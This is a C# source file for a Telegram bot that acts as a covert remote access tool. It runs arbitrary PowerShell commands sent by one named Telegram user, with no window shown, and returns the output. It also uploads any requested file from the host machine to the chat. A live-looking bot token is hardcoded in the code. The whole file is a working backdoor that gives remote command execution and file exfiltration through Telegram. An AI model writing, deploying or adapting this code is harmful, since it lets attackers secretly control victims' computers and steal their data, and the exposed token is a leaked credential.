using System.Diagnostics;
using System.Text;
using Telegram.Bot;
using Telegram.Bot.Extensions.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;

var botClient = new TelegramBotClient("1360871763:AAEngq_0nJBt--P0f0DMNu_i3JPkuFnGFws");

await botClient.ReceiveAsync(
    HandleUpdateAsync,
    HandleErrorAsync,
    new ReceiverOptions { AllowedUpdates = new UpdateType[] {UpdateType.Message, UpdateType.CallbackQuery}}
);

async Task HandleErrorAsync(ITelegramBotClient arg1, Exception arg2, CancellationToken arg3)
{
    await Task.CompletedTask;
}

async Task HandleUpdateAsync(ITelegramBotClient arg1, Update update, CancellationToken arg3)
{
    if (update.Message is Message message
        && message.Text is string text
        && message.From!.Username == "RobCK")
        {
            switch (text)
            {
                case "/pws":
                    if (message.ReplyToMessage is Message replyToMessage
                        && replyToMessage.Text is string replyText)
                    {
                        var powershell = new powerShellProc(replyText);
                        string output = powershell.Run();
                        if (output.Length < 2000)
                            await botClient.SendTextMessageAsync(message.Chat.Id, output, replyToMessageId: message.MessageId);
                        else
                            using (var stream1 = new MemoryStream(buffer: new UnicodeEncoding().GetBytes(output)))
                                await botClient.SendDocumentAsync(
                                    message.Chat.Id,
                                    new Telegram.Bot.Types.InputFiles.InputOnlineFile
                                    (stream1, "output.txt"),
                                    replyToMessageId: message.MessageId
                                );
                    }
                    else
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Reply needed");
                    break;
                case "/dl":
                    if (message.ReplyToMessage is Message replyToMessaged
                            && replyToMessaged.Text is string replyTextpath)
                    {
                        if (System.IO.File.Exists(replyTextpath))
                        {
                            using var sr = new StreamReader(replyTextpath);
                            await botClient.SendDocumentAsync(
                                    message.Chat.Id,
                                    new Telegram.Bot.Types.InputFiles.InputOnlineFile
                                    (sr.BaseStream, Path.GetFileName(replyTextpath)),
                                    replyToMessageId: message.MessageId
                                );
                        }
                        else
                            await botClient.SendTextMessageAsync(message.Chat.Id, "File does not exist", replyToMessageId: replyToMessaged.MessageId);
                    }
                    else
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Reply needed");
                    break;
                default:
                    break;
            }
        }

}
internal class powerShellProc
{
    private Process _process;

    public powerShellProc(string arg)
    {
        _process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "powershell",
                Arguments = arg,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
            },
        };
        
        
    }

    internal string Run()
    {
        _process.Start();
        var outp = _process.StandardOutput.ReadToEnd();
        outp += _process.StandardError.ReadToEnd();
        return outp;
    }
}
